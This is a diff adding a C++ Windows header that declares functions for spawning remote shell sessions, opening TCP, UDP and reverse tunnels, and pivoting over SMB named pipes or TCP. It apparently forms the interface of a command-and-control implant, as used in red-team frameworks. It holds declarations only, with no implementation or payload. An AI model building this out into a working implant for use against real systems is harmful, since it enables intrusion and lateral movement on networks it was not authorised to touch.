@@ -1,0 +1,36 @@
+#pragma once
+
+#include <winsock2.h>
+#include <windows.h>
+#include <stdint.h>
+
+#include <vector>
+
+namespace transport_scaffold {
+
+static const uint8_t PIVOT_TYPE_SMB = 1;
+static const uint8_t PIVOT_TYPE_TCP = 2;
+static const uint8_t PIVOT_TYPE_DISCONNECT = 10;
+static const uint32_t REVERSE_TUNNEL_TYPE = 5;
+
+std::vector<uint32_t> ShellJobEntries();
+
+BOOL StartShellSession(uint32_t shellId, const char* programArgs, DWORD* outError);
+BOOL WriteShellInput(uint32_t shellId, const uint8_t* data, uint32_t len, DWORD* outError);
+BOOL CloseShellSession(uint32_t shellId);
+BOOL KillShellJob(uint32_t shellId);
+
+BOOL StartTcpTunnel(uint32_t channelId, uint32_t tunnelType, const char* address, uint16_t port, std::vector<uint8_t>* outPayload, DWORD* outError);
+BOOL StartUdpTunnel(uint32_t channelId, const char* address, uint16_t port, std::vector<uint8_t>* outPayload, DWORD* outError);
+std::vector<uint8_t> StartReverseTunnel(uint32_t tunnelId, uint16_t port);
+BOOL WriteTunnelData(uint32_t channelId, const uint8_t* data, uint32_t len, DWORD* outError);
+void NoteTunnelWriteFailure(uint32_t channelId, uint32_t result);
+void SetTunnelPaused(uint32_t channelId, BOOL paused);
+BOOL CloseTunnelSession(uint32_t channelId);
+
+BOOL StartPivotTcp(uint32_t pivotId, const char* address, uint16_t port, std::vector<uint8_t>* outPayload, DWORD* outError);
+BOOL StartPivotSmb(uint32_t pivotId, const char* pipeName, std::vector<uint8_t>* outPayload, DWORD* outError);
+BOOL WritePivotData(uint32_t pivotId, const uint8_t* data, uint32_t len, DWORD* outError);
+uint8_t ClosePivotSession(uint32_t pivotId);
+
+} // namespace transport_scaffold
